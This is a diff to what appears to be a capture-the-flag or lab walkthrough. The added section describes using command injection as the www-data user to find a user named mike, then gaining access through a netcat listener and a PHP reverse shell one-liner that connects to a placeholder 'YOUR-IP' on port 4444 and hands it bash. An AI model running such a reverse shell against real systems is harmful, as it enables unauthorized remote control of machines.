@@ -65,6 +65,12 @@ www-data
 
 ## Shell
 Here is the idea for a python script that it will help a little. It's the **command_injection.py** script. With this script i can navigate to the directories and files that the www-data user has access. With this way i found the user mike under the home directory.
+<img width="446" height="466" alt="image" src="https://github.com/user-attachments/assets/4a3fb30e-5420-4a76-bc76-e2e1e7c6d151" />
+
+So now it's time to send a revesre shell and take access on the target system. I use a php reverse shell that I find on Reverse Shell Generator (https://www.revshells.com/) and before I use it a start a netcat listener.
+```
+php -r '$sock=fsockopen("YOUR-IP",4444);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+```
 
 ## Root Access
 
